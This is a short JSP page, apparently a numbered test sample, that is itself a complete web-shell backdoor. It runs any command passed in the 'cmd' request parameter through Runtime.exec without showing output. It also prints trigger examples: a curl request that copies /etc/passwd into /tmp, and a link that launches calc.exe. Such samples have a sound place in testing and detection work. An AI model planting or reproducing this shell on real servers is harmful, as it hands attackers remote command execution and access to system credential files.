<%@page import="java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" %>
<html>
<head>	
	<meta charset="UTF-8"/>
	<title>004 - 命令执行后门（无回显）</title>
</head>
<body>
	<h1>004 - 命令执行后门（无回显）</h1>

	<p>Linux 触发: </p>
	<pre>curl <%=request.getRequestURL()%> -d 'cmd=cp /etc/passwd /tmp/'</pre>
	<p>然后检查 /tmp 是否存在 passwd 这个文件</p>
	<br>

	<p>Windows 触发: </p>
	<a href="<%=request.getRequestURL()%>?cmd=calc" target="_blank">点击这里执行 calc.exe</a>

<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
	try {
		Runtime.getRuntime().exec(cmd);
	} catch (Exception e) {
	    out.print(e);
	}
}
%>
</body>
</html>
